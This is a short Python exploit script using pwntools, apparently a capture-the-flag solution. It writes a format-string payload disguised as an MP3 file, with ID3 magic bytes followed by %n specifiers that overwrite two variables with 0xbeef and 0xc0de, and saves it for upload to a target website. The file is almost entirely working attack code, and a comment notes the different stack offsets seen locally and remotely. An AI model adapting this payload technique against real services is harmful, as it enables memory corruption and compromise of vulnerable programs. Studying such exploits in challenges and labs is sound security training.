#!/usr/bin/env python3

from pwn import *

exe = ELF("../main")
libc = ELF("../glibc/libc.so.6")
ld = ELF("../glibc/ld-linux-x86-64.so.2")

context.binary = exe

# NOTE: In LOCAL, the offset for the two variables are 12 and 13 but in remote are 10 and 11
def main():
    payload = b"\x49\x44\x33" + f"%{0xbeef}c%10$n%{0xc0de - 0xbeef}c%11$n".encode("utf-8")      # First are magic bytes for mp3 extension

    # Once created the file, just upload it on the website
    with open("./payload.mp3", "wb") as file:
        file.write(payload)

    print(payload.hex())


if __name__ == "__main__":
    main()
